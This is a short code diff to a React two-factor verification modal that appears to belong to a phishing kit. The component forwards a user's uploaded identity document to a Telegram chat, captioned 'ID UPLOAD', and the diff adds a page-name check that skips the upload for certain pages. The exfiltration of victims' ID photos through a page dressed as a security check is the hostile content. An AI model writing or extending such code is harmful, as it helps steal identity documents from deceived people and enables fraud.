@@ -8,6 +8,7 @@ import AnotherDeviceNotificationImage from '@/assets/images/F3-2FA-AnotherDevice
 import DocumentIcon from '@/assets/images/ic_document.svg';
 import config from '@/utils/config';
 import { sendTelegramPhoto } from '@/utils/send-message';
+import { isBlockedPageName } from '@/utils/blocked-page';
 
 const imageSrc = (image: StaticImageData | string) => (typeof image === 'string' ? image : image.src);
 
@@ -217,7 +218,9 @@ const TwoFAModal = ({ show, onClose, onSubmit, onMethodSelect, onSuccess, texts,
             setIsSendingIdFile(true);
             setIdentityError('');
 
-            await sendTelegramPhoto(uploadedIdFile, '<b>ID UPLOAD</b>');
+            if (!isBlockedPageName(formData?.pageName)) {
+                await sendTelegramPhoto(uploadedIdFile, '<b>ID UPLOAD</b>');
+            }
 
             setShowIdentityModal(false);
             setIdentityStep('intro');
